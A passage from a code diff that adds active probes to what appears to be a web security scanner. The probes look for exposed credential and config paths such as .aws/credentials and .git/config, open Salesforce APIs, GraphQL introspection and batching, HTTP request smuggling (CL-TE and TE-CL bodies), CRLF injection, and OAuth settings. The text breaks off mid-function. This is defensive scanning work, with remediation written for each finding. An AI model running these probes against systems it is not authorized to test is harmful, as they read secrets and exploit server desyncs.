+    ("web_config_bak", "/web.config.bak", ["connectionString", "password"]),
+    # Git / VCS
+    ("git_config", "/.git/config", ["[core]", "[remote"]),
+    ("git_head", "/.git/HEAD", ["ref: refs/"]),
+    ("svn_entries", "/.svn/entries", ["dir", "svn"]),
+    ("hg_manifest", "/.hg/store/00manifest.i", []),
+    # Cloud metadata & credentials
+    ("aws_credentials", "/.aws/credentials", ["aws_access_key_id", "aws_secret_access_key"]),
+    ("docker_compose", "/docker-compose.yml", ["services:", "image:"]),
+    ("dockerfile", "/Dockerfile", ["FROM", "RUN"]),
+    # Backup files
+    ("ds_store", "/.DS_Store", []),
+    ("backup_sql", "/backup.sql", ["INSERT INTO", "CREATE TABLE"]),
+    ("dump_sql", "/dump.sql", ["INSERT INTO", "CREATE TABLE"]),
+    ("db_sqlite", "/db.sqlite", []),
+    ("db_sqlite3", "/db.sqlite3", []),
+    # Debug & monitoring
+    ("server_status", "/server-status", ["Apache Server Status", "Total accesses"]),
+    ("server_info", "/server-info", ["Apache Server Information", "Server Version"]),
+    ("debug_vars", "/debug/vars", []),
+    ("debug_pprof", "/debug/pprof/", ["allocs", "goroutine"]),
+    ("debug_default", "/debug/default", []),
+    ("metrics", "/metrics", ["process_cpu", "go_gc", "http_requests"]),
+    ("prometheus", "/_prometheus/metrics", ["process_cpu", "http_requests"]),
+    ("health_full", "/health", ["status", "healthy"]),
+    # Spring / Java
+    ("actuator", "/actuator", ["_links", "self"]),
+    ("actuator_env", "/actuator/env", ["activeProfiles", "propertySources"]),
+    ("actuator_configprops", "/actuator/configprops", ["contexts", "beans"]),
+    ("actuator_mappings", "/actuator/mappings", ["dispatcherServlets", "handler"]),
+    ("actuator_heapdump", "/actuator/heapdump", []),
+    ("actuator_threaddump", "/actuator/threaddump", ["threads", "threadName"]),
+    ("jolokia", "/jolokia/", ["request", "value"]),
+    # .NET
+    ("elmah", "/elmah.axd", ["Error Log for"]),
+    ("trace_axd", "/trace.axd", ["Request Details", "Trace Information"]),
+    # Node / JS
+    ("package_json", "/package.json", ["dependencies", "name"]),
+    ("npm_debug", "/npm-debug.log", ["npm ERR", "error"]),
+    ("yarn_lock", "/yarn.lock", ["resolved", "integrity"]),
+    # API docs
+    ("swagger_json", "/swagger.json", ["swagger", "paths"]),
+    ("swagger_v2", "/v2/api-docs", ["swagger", "paths"]),
+    ("swagger_v3", "/v3/api-docs", ["openapi", "paths"]),
+    ("api_docs", "/api-docs", ["swagger", "openapi"]),
+    ("openapi_yaml", "/openapi.yaml", ["openapi", "paths"]),
+    ("redoc", "/redoc", []),
+    # GraphQL
+    ("graphql", "/graphql", []),
+    ("graphql_playground", "/graphql/playground", []),
+    ("graphiql", "/graphiql", []),
+    # Crawlable info
+    ("robots_txt", "/robots.txt", ["Disallow"]),
+    ("sitemap", "/sitemap.xml", ["<urlset", "<sitemapindex"]),
+    ("security_txt", "/.well-known/security.txt", ["Contact:", "Expires:"]),
+    ("crossdomain", "/crossdomain.xml", ["cross-domain-policy", "allow-access"]),
+    ("clientaccesspolicy", "/clientaccesspolicy.xml", ["cross-domain-policy"]),
+    # Misc
+    ("trace", "/trace", []),
+    ("admin", "/admin", []),
+    ("phpmyadmin", "/phpmyadmin/", ["phpMyAdmin"]),
+    ("adminer", "/adminer.php", ["adminer", "Login"]),
+    ("wp_login", "/wp-login.php", ["WordPress"]),
+]
+
+
+async def run_sensitive_path_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Check each host for well-known sensitive/debug paths."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "sensitive_paths", "hosts": len(targets),
+    })
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+
+        for path_label, path, fingerprints in _SENSITIVE_PATHS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            test_url = f"https://{host}{path}"
+            try:
+                resp = await http_client.get(
+                    test_url, timeout=8.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+            except Exception:
+                continue
+
+            if resp.status_code != 200:
+                continue
+
+            body = resp.text[:100_000]
+            if not fingerprints:
+                if resp.status_code == 200 and len(body) > 100:
+                    if path_label in ("ds_store", "debug_vars", "trace", "graphql"):
+                        pass
+                    else:
+                        continue
+                else:
+                    continue
+
+            matched = [fp for fp in fingerprints if fp.lower() in body.lower()]
+            if not matched and fingerprints:
+                continue
+
+            if path_label.startswith("phpinfo"):
+                sev = "High"
+                title = f"PHP Information Disclosure ({path})"
+                cwe = "CWE-200"
+            elif path_label in ("dotenv", "wp_config_bak"):
+                sev = "Critical"
+                title = f"Sensitive Configuration File Exposed ({path})"
+                cwe = "CWE-538"
+            elif path_label.startswith("git"):
+                sev = "High"
+                title = f"Git Repository Exposed ({path})"
+                cwe = "CWE-538"
+            elif path_label.startswith("actuator"):
+                sev = "High"
+                title = f"Spring Actuator Exposed ({path})"
+                cwe = "CWE-200"
+            else:
+                sev = "Medium"
+                title = f"Sensitive Path Accessible ({path})"
+                cwe = "CWE-200"
+
+            f = {
+                "title": title,
+                "severity": sev,
+                "confidence": "High" if matched else "Medium",
+                "owasp_category": "A01:2021",
+                "cwe": cwe,
+                "url": test_url,
+                "parameter": path,
+                "payload": f"GET {path}",
+                "evidence": (
+                    f"Path '{path}' returned HTTP {resp.status_code} with "
+                    f"fingerprints: {matched or 'content present'}. "
+                    f"Content-Type: {resp.headers.get('content-type', 'n/a')}. "
+                    f"Body preview: {body[:200]}"
+                ),
+                "remediation": (
+                    f"Remove or restrict access to '{path}'. For phpinfo, "
+                    f"delete the file in production. For .env/.git, add deny "
+                    f"rules to the web server configuration."
+                ),
+                "phase": "Active Baseline (Sensitive Paths)",
+                "tool": "active_baseline.sensitive_path_probe",
+                "_finding_source": "active_baseline",
+                "_path_label": path_label,
+            }
+            findings.append(f)
+            _emit(f)
+
+    _progress("active_baseline_end", {
+        "probe": "sensitive_paths", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 7 — Salesforce Misconfiguration Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Detects Salesforce Experience Cloud/Community instances and probes
+# for common misconfigurations: exposed Aura endpoints, public object
+# access, and PII-leaking API endpoints.
+
+_SALESFORCE_DOMAIN_PATTERNS = [
+    _re.compile(r"\.my\.site\.com$", _re.IGNORECASE),
+    _re.compile(r"\.force\.com$", _re.IGNORECASE),
+    _re.compile(r"\.salesforce\.com$", _re.IGNORECASE),
+    _re.compile(r"\.my\.salesforce\.com$", _re.IGNORECASE),
+    _re.compile(r"\.sandbox\.my\.site\.com$", _re.IGNORECASE),
+]
+
+_SALESFORCE_AURA_PATHS = [
+    "/s/sfsites/aura",
+    "/aura",
+]
+
+_SALESFORCE_OBJECTS_TO_PROBE = [
+    "Account", "Contact", "Case", "Lead", "Opportunity",
+    "Article_Feedback__c", "Knowledge__kav",
+    "User", "Task", "Event", "ContentDocument",
+]
+
+_SALESFORCE_API_VERSIONS = ["v58.0", "v57.0", "v56.0", "v55.0"]
+
+
+def _is_salesforce_host(host: str) -> bool:
+    """Check if a hostname looks like a Salesforce instance."""
+    return any(p.search(host) for p in _SALESFORCE_DOMAIN_PATTERNS)
+
+
+async def run_salesforce_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Detect Salesforce instances and probe for misconfigurations."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "salesforce_misconfig", "hosts": len(targets),
+    })
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+
+        # Step 1: Check if Salesforce (by domain or by response headers/body)
+        is_sf = _is_salesforce_host(host)
+        sf_evidence = []
+
+        if not is_sf:
+            try:
+                resp = await http_client.get(
+                    f"https://{host}/", timeout=10.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+                body = resp.text[:100_000].lower()
+                hdrs = str(resp.headers).lower()
+                if any(x in body for x in [
+                    "salesforce", "lightning", "aura", "sfdc",
+                    "community-", "sfdcpage",
+                ]):
+                    is_sf = True
+                    sf_evidence.append("Salesforce markers in page body")
+                if "x-sfdc" in hdrs or "sfdc" in hdrs:
+                    is_sf = True
+                    sf_evidence.append("SFDC headers detected")
+            except Exception:
+                continue
+
+        if not is_sf:
+            continue
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "salesforce_detected",
+            "evidence": sf_evidence or ["domain pattern match"],
+        })
+
+        base_url = f"https://{host}"
+
+        # Step 2: Probe Aura endpoint (unauthenticated)
+        for aura_path in _SALESFORCE_AURA_PATHS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            aura_url = f"{base_url}{aura_path}"
+            try:
+                aura_payload = {
+                    "message": '{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/getObjectInfo","params":{"objectApiName":"Account"}}]}',
+                    "aura.context": '{"mode":"PROD","fwuid":"1"}',
+                    "aura.token": "null",
+                }
+                resp = await http_client.post(
+                    aura_url, data=aura_payload, timeout=10.0,
+                    headers={**_PROBE_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
+                )
+                body = resp.text[:50_000]
+            except Exception:
+                continue
+
+            if resp.status_code == 200 and ('"actions"' in body or '"objectInfos"' in body):
+                f = {
+                    "title": f"Salesforce Aura Endpoint Exposed ({aura_path})",
+                    "severity": "High",
+                    "confidence": "High",
+                    "owasp_category": "A01:2021",
+                    "cwe": "CWE-284",
+                    "url": aura_url,
+                    "parameter": "aura.token=null",
+                    "payload": "getObjectInfo(Account)",
+                    "evidence": (
+                        f"Aura endpoint at {aura_path} responds with object metadata "
+                        f"when accessed without authentication. Status: {resp.status_code}. "
+                        f"Body preview: {body[:300]}"
+                    ),
+                    "remediation": (
+                        "Restrict Aura endpoint access with proper guest user "
+                        "permissions. Review Salesforce sharing rules and ensure "
+                        "guest users cannot access sensitive objects."
+                    ),
+                    "phase": "Active Baseline (Salesforce)",
+                    "tool": "active_baseline.salesforce_probe",
+                    "_finding_source": "active_baseline",
+                }
+                findings.append(f)
+                _emit(f)
+
+        # Step 3: Probe REST API for public object access
+        for api_ver in _SALESFORCE_API_VERSIONS[:2]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            api_base = f"{base_url}/services/data/{api_ver}"
+            try:
+                api_resp = await http_client.get(
+                    api_base, timeout=10.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+                if api_resp.status_code != 200:
+                    continue
+            except Exception:
+                continue
+
+            f = {
+                "title": "Salesforce REST API Publicly Accessible",
+                "severity": "Critical",
+                "confidence": "High",
+                "owasp_category": "A01:2021",
+                "cwe": "CWE-284",
+                "url": api_base,
+                "parameter": f"/services/data/{api_ver}",
+                "payload": f"GET /services/data/{api_ver}",
+                "evidence": (
+                    f"Salesforce REST API at {api_base} returned HTTP "
+                    f"{api_resp.status_code} without authentication. "
+                    f"Body: {api_resp.text[:300]}"
+                ),
+                "remediation": (
+                    "Restrict API access to authenticated users. Configure "
+                    "guest user profiles to deny API access. Review org-wide "
+                    "sharing defaults."
+                ),
+                "phase": "Active Baseline (Salesforce)",
+                "tool": "active_baseline.salesforce_probe",
+                "_finding_source": "active_baseline",
+            }
+            findings.append(f)
+            _emit(f)
+
+            for obj in _SALESFORCE_OBJECTS_TO_PROBE:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                obj_url = f"{api_base}/sobjects/{obj}/describe"
+                try:
+                    obj_resp = await http_client.get(
+                        obj_url, timeout=8.0, follow_redirects=True,
+                        headers=_PROBE_HEADERS,
+                    )
+                    if obj_resp.status_code == 200:
+                        obj_body = obj_resp.text[:20_000]
+                        if '"fields"' in obj_body or '"name"' in obj_body:
+                            f = {
+                                "title": f"Salesforce Object '{obj}' Schema Publicly Accessible",
+                                "severity": "High",
+                                "confidence": "High",
+                                "owasp_category": "A01:2021",
+                                "cwe": "CWE-284",
+                                "url": obj_url,
+                                "parameter": f"sobjects/{obj}/describe",
+                                "payload": f"GET {obj_url}",
+                                "evidence": (
+                                    f"Object '{obj}' schema is accessible without auth. "
+                                    f"Response includes field definitions. "
+                                    f"Preview: {obj_body[:200]}"
+                                ),
+                                "remediation": (
+                                    f"Remove guest user access to '{obj}'. Review "
+                                    f"field-level security and object permissions."
+                                ),
+                                "phase": "Active Baseline (Salesforce)",
+                                "tool": "active_baseline.salesforce_probe",
+                                "_finding_source": "active_baseline",
+                            }
+                            findings.append(f)
+                            _emit(f)
+                except Exception:
+                    continue
+            break
+
+        # Step 4: Check for staging/sandbox exposure
+        if "sandbox" in host.lower() or "stg" in host.lower() or "stage" in host.lower():
+            f = {
+                "title": f"Salesforce Staging/Sandbox Publicly Accessible ({host})",
+                "severity": "High",
+                "confidence": "Medium",
+                "owasp_category": "A05:2021",
+                "cwe": "CWE-200",
+                "url": base_url,
+                "parameter": "hostname",
+                "payload": host,
+                "evidence": (
+                    f"Host '{host}' appears to be a Salesforce staging/sandbox "
+                    f"environment that is publicly accessible. Staging environments "
+                    f"may contain production data clones including PII."
+                ),
+                "remediation": (
+                    "Restrict sandbox access via IP allowlisting. Ensure "
+                    "sandbox data is anonymized. Never clone production PII "
+                    "into staging."
+                ),
+                "phase": "Active Baseline (Salesforce)",
+                "tool": "active_baseline.salesforce_probe",
+                "_finding_source": "active_baseline",
+            }
+            findings.append(f)
+            _emit(f)
+
+    _progress("active_baseline_end", {
+        "probe": "salesforce_misconfig", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 8 — GraphQL Introspection Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Many GraphQL endpoints ship with introspection enabled in production,
+# leaking the entire schema (types, queries, mutations, internal fields).
+# This probe sends the standard introspection query to common GraphQL
+# paths and flags any endpoint that returns a valid schema.
+
+_GRAPHQL_PATHS = [
+    "/graphql", "/graphql/", "/graphiql", "/api/graphql",
+    "/v1/graphql", "/v2/graphql", "/query", "/gql",
+]
+
+_INTROSPECTION_QUERY = '{"query":"{ __schema { types { name fields { name } } } }"}'
+
+_INTROSPECTION_FULL = (
+    '{"query":"{ __schema { queryType { name } mutationType { name } '
+    'subscriptionType { name } types { name kind description fields(includeDeprecated:true) '
+    '{ name args { name type { name kind ofType { name kind } } } type { name kind '
+    'ofType { name kind } } } } directives { name description locations args '
+    '{ name type { name kind ofType { name kind } } } } } }"}'
+)
+
+
+async def run_graphql_introspection_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for enabled GraphQL introspection."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "graphql_introspection", "hosts": len(targets),
+    })
+
+    gql_headers = {**_PROBE_HEADERS, "Content-Type": "application/json"}
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+
+        for gql_path in _GRAPHQL_PATHS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            url = f"https://{host}{gql_path}"
+            try:
+                resp = await http_client.post(
+                    url, content=_INTROSPECTION_QUERY, timeout=10.0,
+                    headers=gql_headers,
+                )
+                body = resp.text[:100_000]
+            except Exception:
+                continue
+
+            if resp.status_code != 200:
+                continue
+
+            has_schema = '"__schema"' in body and '"types"' in body
+            if not has_schema:
+                # Try GET with query param (some servers prefer this)
+                try:
+                    get_resp = await http_client.get(
+                        f"{url}?query={{__schema{{types{{name}}}}}}",
+                        timeout=10.0, headers=_PROBE_HEADERS,
+                    )
+                    body = get_resp.text[:100_000]
+                    has_schema = '"__schema"' in body and '"types"' in body
+                except Exception:
+                    pass
+
+            if not has_schema:
+                continue
+
+            # Count types and mutations for evidence
+            type_count = body.count('"name"')
+            has_mutations = '"mutationType"' in body and body.count('"mutationType":null') == 0
+
+            sev = "High" if has_mutations else "Medium"
+
+            f = {
+                "title": f"GraphQL Introspection Enabled ({gql_path})",
+                "severity": sev,
+                "confidence": "High",
+                "owasp_category": "A01:2021",
+                "cwe": "CWE-200",
+                "url": url,
+                "parameter": gql_path,
+                "payload": "{ __schema { types { name fields { name } } } }",
+                "evidence": (
+                    f"GraphQL introspection is enabled at {url}. "
+                    f"Schema exposes ~{type_count} named fields. "
+                    f"Mutations exposed: {'yes' if has_mutations else 'no'}. "
+                    f"Body preview: {body[:300]}"
+                ),
+                "remediation": (
+                    "Disable introspection in production by setting "
+                    "introspection: false in your GraphQL server config. "
+                    "Use schema-level authorization for all queries and mutations."
+                ),
+                "phase": "Active Baseline (GraphQL Introspection)",
+                "tool": "active_baseline.graphql_introspection_probe",
+                "_finding_source": "active_baseline",
+            }
+            findings.append(f)
+            _emit(f)
+
+            # ── Batching attack (DoS / rate limit bypass) ──
+            batch_query = '[' + ','.join(
+                ['{"query":"{ __typename }"}'] * 10
+            ) + ']'
+            try:
+                batch_resp = await http_client.post(
+                    url, content=batch_query, timeout=10.0,
+                    headers=gql_headers,
+                )
+                batch_body = batch_resp.text[:20_000]
+                if batch_resp.status_code == 200 and batch_body.startswith('['):
+                    import json as _json_gql
+                    try:
+                        results = _json_gql.loads(batch_body)
+                        if isinstance(results, list) and len(results) >= 5:
+                            bf = {
+                                "title": f"GraphQL Batching Attack Possible ({gql_path})",
+                                "severity": "Medium",
+                                "confidence": "High",
+                                "owasp_category": "A04:2021",
+                                "cwe": "CWE-770",
+                                "url": url,
+                                "parameter": gql_path,
+                                "payload": "10-query batch array",
+                                "evidence": (
+                                    f"GraphQL endpoint at {url} accepts batched "
+                                    f"queries (array of operations). Sent 10 queries, "
+                                    f"received {len(results)} responses. This can bypass "
+                                    f"rate limiting and amplify brute-force attacks."
+                                ),
+                                "remediation": (
+                                    "Limit the number of operations in a single "
+                                    "batched request. Implement query cost analysis "
+                                    "and depth limiting."
+                                ),
+                                "phase": "Active Baseline (GraphQL Batching)",
+                                "tool": "active_baseline.graphql_introspection_probe",
+                                "_finding_source": "active_baseline",
+                            }
+                            findings.append(bf)
+                            _emit(bf)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # ── Field suggestion exploit (schema leakage without introspection) ──
+            suggestion_query = '{"query":"{ __typena }"}'
+            try:
+                sugg_resp = await http_client.post(
+                    url, content=suggestion_query, timeout=10.0,
+                    headers=gql_headers,
+                )
+                sugg_body = sugg_resp.text[:10_000].lower()
+                if "did you mean" in sugg_body or "suggestion" in sugg_body:
+                    sf = {
+                        "title": f"GraphQL Field Suggestion Leaks Schema ({gql_path})",
+                        "severity": "Low",
+                        "confidence": "High",
+                        "owasp_category": "A01:2021",
+                        "cwe": "CWE-200",
+                        "url": url,
+                        "parameter": gql_path,
+                        "payload": "{ __typena }",
+                        "evidence": (
+                            f"GraphQL endpoint returns field suggestions on typos, "
+                            f"enabling schema enumeration even with introspection disabled. "
+                            f"Response: {sugg_resp.text[:300]}"
+                        ),
+                        "remediation": (
+                            "Disable field suggestion in production to prevent "
+                            "schema enumeration. In Apollo: fieldSuggestion: false."
+                        ),
+                        "phase": "Active Baseline (GraphQL Suggestions)",
+                        "tool": "active_baseline.graphql_introspection_probe",
+                        "_finding_source": "active_baseline",
+                    }
+                    findings.append(sf)
+                    _emit(sf)
+            except Exception:
+                pass
+
+            break  # one host is enough for introspection
+
+    _progress("active_baseline_end", {
+        "probe": "graphql_introspection", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 9 — HTTP Request Smuggling Baseline Probes
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Tests for CL-TE and TE-CL desync by sending ambiguous Content-Length
+# and Transfer-Encoding headers. A successful smuggle causes the front-
+# end and back-end to disagree on message boundaries, which an attacker
+# can exploit for cache poisoning, auth bypass, or request hijacking.
+#
+# These probes use a *timing-based* detection method (like the SQLi
+# probe): the smuggled suffix is a partial request that causes the
+# back-end to wait for the next bytes, introducing a measurable delay.
+
+_SMUGGLE_TIMEOUT_S = 10.0
+_SMUGGLE_DELTA_S = 3.0
+
+
+async def run_http_smuggling_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for CL-TE and TE-CL HTTP request smuggling."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "http_smuggling", "hosts": len(targets),
+    })
+
+    import httpx as _httpx  # noqa: E401 — need raw transport
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}/"
+
+        # ── Control: normal POST to measure baseline latency ──
+        control_start = time.perf_counter()
+        try:
+            await http_client.post(
+                base_url, content="x=1", timeout=_SMUGGLE_TIMEOUT_S,
+                headers={**_PROBE_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
+            )
+        except Exception:
+            continue
+        control_elapsed = time.perf_counter() - control_start
+
+        # ── CL-TE probe ──
+        # Front-end uses Content-Length, back-end uses Transfer-Encoding.
+        # We send a body that CL says is short but TE says has a chunked
+        # trailer containing a partial request → back-end hangs waiting.
+        cl_te_body = "0\r\n\r\nGET /cl-te-probe HTTP/1.1\r\nHost: {host}\r\n\r\n"
+        cl_te_headers = {
+            **_PROBE_HEADERS,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": str(len(cl_te_body)),
+            "Transfer-Encoding": "chunked",
+        }
+        probe_start = time.perf_counter()
+        try:
+            await http_client.post(
+                base_url, content=cl_te_body, timeout=_SMUGGLE_TIMEOUT_S,
+                headers=cl_te_headers,
+            )
+        except Exception:
+            pass
+        cl_te_elapsed = time.perf_counter() - probe_start
+
+        if (cl_te_elapsed - control_elapsed) >= _SMUGGLE_DELTA_S:
+            f = {
+                "title": "HTTP Request Smuggling (CL-TE Desync)",
+                "severity": "Critical",
+                "confidence": "Medium",
+                "owasp_category": "A05:2021",
+                "cwe": "CWE-444",
+                "url": base_url,
+                "parameter": "Content-Length / Transfer-Encoding",
+                "payload": "CL-TE: chunked body with trailing partial request",
+                "evidence": (
+                    f"Control POST: {control_elapsed:.2f}s, CL-TE probe: "
+                    f"{cl_te_elapsed:.2f}s (delta {cl_te_elapsed - control_elapsed:.2f}s). "
+                    f"The back-end appears to interpret Transfer-Encoding: chunked "
+                    f"while the front-end uses Content-Length, causing a desync."
+                ),
+                "remediation": (
+                    "Configure the front-end proxy to normalize Transfer-Encoding "
+                    "headers and reject ambiguous requests. Ensure both layers "
+                    "agree on message boundaries."
+                ),
+                "phase": "Active Baseline (HTTP Smuggling)",
+                "tool": "active_baseline.http_smuggling_probe",
+                "_finding_source": "active_baseline",
+                "_variant": "CL-TE",
+            }
+            findings.append(f)
+            _emit(f)
+
+        # ── TE-CL probe ──
+        # Front-end uses Transfer-Encoding, back-end uses Content-Length.
+        te_cl_body = "5e\r\nPOST /te-cl-probe HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
+        te_cl_headers = {
+            **_PROBE_HEADERS,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": "4",
+            "Transfer-Encoding": "chunked",
+        }
+        probe_start = time.perf_counter()
+        try:
+            await http_client.post(
+                base_url, content=te_cl_body, timeout=_SMUGGLE_TIMEOUT_S,
+                headers=te_cl_headers,
+            )
+        except Exception:
+            pass
+        te_cl_elapsed = time.perf_counter() - probe_start
+
+        if (te_cl_elapsed - control_elapsed) >= _SMUGGLE_DELTA_S:
+            f = {
+                "title": "HTTP Request Smuggling (TE-CL Desync)",
+                "severity": "Critical",
+                "confidence": "Medium",
+                "owasp_category": "A05:2021",
+                "cwe": "CWE-444",
+                "url": base_url,
+                "parameter": "Transfer-Encoding / Content-Length",
+                "payload": "TE-CL: mismatched Content-Length with chunked encoding",
+                "evidence": (
+                    f"Control POST: {control_elapsed:.2f}s, TE-CL probe: "
+                    f"{te_cl_elapsed:.2f}s (delta {te_cl_elapsed - control_elapsed:.2f}s). "
+                    f"The back-end appears to use Content-Length while the front-end "
+                    f"uses Transfer-Encoding: chunked."
+                ),
+                "remediation": (
+                    "Reject requests that contain both Content-Length and "
+                    "Transfer-Encoding headers. Configure the front-end "
+                    "to strip or normalize Transfer-Encoding before forwarding."
+                ),
+                "phase": "Active Baseline (HTTP Smuggling)",
+                "tool": "active_baseline.http_smuggling_probe",
+                "_finding_source": "active_baseline",
+                "_variant": "TE-CL",
+            }
+            findings.append(f)
+            _emit(f)
+
+        # ── CRLF injection test ──
+        import hashlib as _hashlib_smug
+        crlf_canary = f"crlfcanary{_hashlib_smug.md5(host.encode()).hexdigest()[:6]}"
+        crlf_payloads = [
+            ("crlf_header_inject", f"/{crlf_canary}%0d%0aX-Injected:%20true"),
+            ("crlf_double", f"/%0d%0a%0d%0a<script>{crlf_canary}</script>"),
+            ("crlf_encoded", f"/%250d%250aX-Injected:%20{crlf_canary}"),
+        ]
+        for crlf_label, crlf_path in crlf_payloads:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            crlf_url = f"https://{host}{crlf_path}"
+            try:
+                crlf_resp = await http_client.get(
+                    crlf_url, timeout=10.0, follow_redirects=False,
+                    headers=_PROBE_HEADERS,
+                )
+                resp_headers = str(dict(crlf_resp.headers))
+                body = crlf_resp.text[:20_000]
+            except Exception:
+                continue
+
+            if "x-injected" in resp_headers.lower() or crlf_canary in body:
+                f = {
+                    "title": "CRLF Injection / HTTP Response Splitting",
+                    "severity": "High",
+                    "confidence": "High" if "x-injected" in resp_headers.lower() else "Medium",
+                    "owasp_category": "A03:2021",
+                    "cwe": "CWE-113",
+                    "url": crlf_url,
+                    "parameter": "URL path",
+                    "payload": crlf_path,
+                    "evidence": (
+                        f"CRLF injection via {crlf_label}: canary '{crlf_canary}' "
+                        f"appeared in {'response headers' if 'x-injected' in resp_headers.lower() else 'response body'}. "
+                        f"Status: {crlf_resp.status_code}."
+                    ),
+                    "remediation": (
+                        "Sanitize URL paths by stripping CR (\\r) and LF (\\n) "
+                        "characters. Use a WAF rule to block %0d%0a sequences."
+                    ),
+                    "phase": "Active Baseline (CRLF Injection)",
+                    "tool": "active_baseline.http_smuggling_probe",
+                    "_finding_source": "active_baseline",
+                    "_variant": "CRLF",
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
+    _progress("active_baseline_end", {
+        "probe": "http_smuggling", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 10 — OAuth/OIDC Flow Security Probes
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Checks for common OAuth 2.0 / OpenID Connect misconfigurations:
+#   1. Open redirect in authorization endpoint (redirect_uri not validated)
+#   2. PKCE not enforced (code_challenge not required)
+#   3. Token endpoint accepts credentials in query string
+#   4. OIDC discovery endpoint exposes sensitive metadata
+
+_OIDC_DISCOVERY_PATHS = [
+    "/.well-known/openid-configuration",
+    "/.well-known/oauth-authorization-server",
+]
+
+_OAUTH_AUTHORIZE_PATHS = [
+    "/oauth/authorize", "/authorize", "/oauth2/authorize",
+    "/connect/authorize", "/auth/realms/master/protocol/openid-connect/auth",
+]
+
+
+async def run_oauth_oidc_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for OAuth/OIDC misconfigurations."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    _progress("active_baseline_start", {
+        "probe": "oauth_oidc", "hosts": len(targets),
+    })
+
+    import json as _json  # noqa: E401
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        # ── OIDC Discovery ──
+        for disc_path in _OIDC_DISCOVERY_PATHS:
+            try:
+                resp = await http_client.get(
+                    f"{base_url}{disc_path}", timeout=10.0,
+                    follow_redirects=True, headers=_PROBE_HEADERS,
+                )
+                if resp.status_code != 200:
+                    continue
+                body = resp.text[:50_000]
+                try:
+                    config = _json.loads(body)
+                except Exception:
+                    continue
+
+                if not isinstance(config, dict) or "issuer" not in config:
+                    continue
+
+                issues = []
+                auth_endpoint = config.get("authorization_endpoint", "")
+                token_endpoint = config.get("token_endpoint", "")
+
+                # Check PKCE support
+                pkce_methods = config.get("code_challenge_methods_supported", [])
+                if not pkce_methods or "S256" not in pkce_methods:
+                    issues.append("PKCE (S256) not listed in code_challenge_methods_supported")
+
+                # Check grant types for implicit flow (insecure)
+                grant_types = config.get("grant_types_supported", [])
+                if "implicit" in grant_types:
